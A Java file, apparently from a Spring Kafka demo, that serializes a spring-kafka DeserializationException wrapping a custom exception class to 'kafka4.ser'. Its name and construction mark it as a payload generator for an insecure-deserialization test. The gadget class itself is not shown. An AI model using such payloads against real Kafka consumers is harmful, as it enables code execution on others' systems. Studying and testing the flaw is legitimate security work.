package com.example.SpringKafkaDemo.data;

import org.springframework.kafka.support.serializer.DeserializationException;

import java.io.*;

public class GenerateEvilSerializationData implements Serializable {



    public static void main(String[] args) throws IOException {

      //  String str = "test";
      //  byte[] bytesArray = str.getBytes();
      //  DeserializationException deserializationException = new DeserializationException(str,bytesArray,false,new CustomExceptionClass());
      //  ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
      //  ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
      //  objectOutputStream.writeObject(deserializationException);

      //  byte[] bytes = byteArrayOutputStream.toByteArray();
     //   StringBuilder result = new StringBuilder();
     //   for (byte aByte : bytes){
     //       result.append(String.format("%02x",aByte));
    //    }
    //    System.out.println(result);

        ObjectOutputStream out = new ObjectOutputStream(new FileOutputStream("kafka4.ser"));
        byte[] bytesArray = "test".getBytes();
        DeserializationException deserializationException = new DeserializationException("test",bytesArray,false,new CustomExceptionClass());
        out.writeObject(deserializationException);
        out.close();
    }
}
